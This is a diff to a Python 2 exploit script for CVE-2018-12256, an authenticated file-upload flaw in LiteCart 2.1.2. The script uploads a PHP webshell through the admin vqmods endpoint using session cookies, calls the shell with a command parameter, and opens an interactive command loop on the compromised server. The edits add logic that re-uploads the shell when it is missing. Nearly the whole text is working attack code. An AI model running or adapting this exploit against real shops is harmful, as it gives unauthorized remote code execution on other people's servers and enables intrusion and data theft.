@@ -1,35 +1,13 @@
-# Exploit Title: LiteCart 2.1.2 - Arbitrary File Upload
-# Date: 2018-08-27
 # Exploit Author: Haboob Team
 # Software Link: https://www.litecart.net/downloading?version=2.1.2
 # Version: 2.1.2
 # CVE : CVE-2018-12256
-
-# 1. Description
-# admin/vqmods.app/vqmods.inc.php in LiteCart 2.1.2 allows remote authenticated attackers 
-# to upload a malicious file (resulting in remote code execution) by using the text/xml 
-# or application/xml Content-Type in a public_html/admin/?app=vqmods&doc=vqmods request.
- 
-# 2. Proof of Concept
  
 #!/usr/bin/env python
-import mechanize
-import cookielib
-import urllib2
-import requests
-import sys
-import argparse
-import random
-import string
-
-
-
-
+import mechanize, cookielib, urllib2, requests, sys, argparse, random, string
 
 from cmd import Cmd
 pooner = open('poone.php', 'r')
-
-
 
 parser = argparse.ArgumentParser(description='LiteCart')
 parser.add_argument('-t',
@@ -78,17 +56,22 @@ files = {
 
 
 
-response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
+#mods by github.com/p4yl0ad
 r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id")
 
 if r.status_code == 200:
-    print url + "../vqmod/xml/" + rand + ".php?c=id"
     print r.content
+    print "starting cmdloop big boi, get that w00t"
+   
+if r.status_code == 404:
+    print "file not found, uploading to target"
+    response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
+    r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id")
 else:
     print "Sorry something went wrong"
 
 
-#mods by github.com/p4yl0ad
+
 
 
 class loop(Cmd):
